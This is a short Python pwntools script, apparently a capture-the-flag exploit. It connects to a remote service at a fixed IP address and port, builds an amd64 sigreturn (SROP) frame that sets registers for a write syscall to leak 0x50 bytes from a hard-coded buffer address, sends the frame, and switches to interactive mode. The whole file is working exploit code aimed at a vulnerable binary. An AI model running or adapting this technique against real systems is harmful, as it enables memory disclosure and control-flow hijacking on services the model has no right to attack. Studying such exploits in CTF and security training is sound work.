import os
import sys
from pwn import *

#r = remote("localhost", 2015)
r = remote("163.172.176.29", 9034)
frame = SigreturnFrame(arch='amd64')
frame.rax = 1 #syscall number
frame.rdi = 1 #syscall FD
frame.rsi = 0x0000000010000023 #buff addr
frame.rdx = 0x50 #length
frame.rip = 0x10000012 #syscall inst addr
frame.rsp = 0
exp = str(frame)
r.send(exp)
r.interactive()
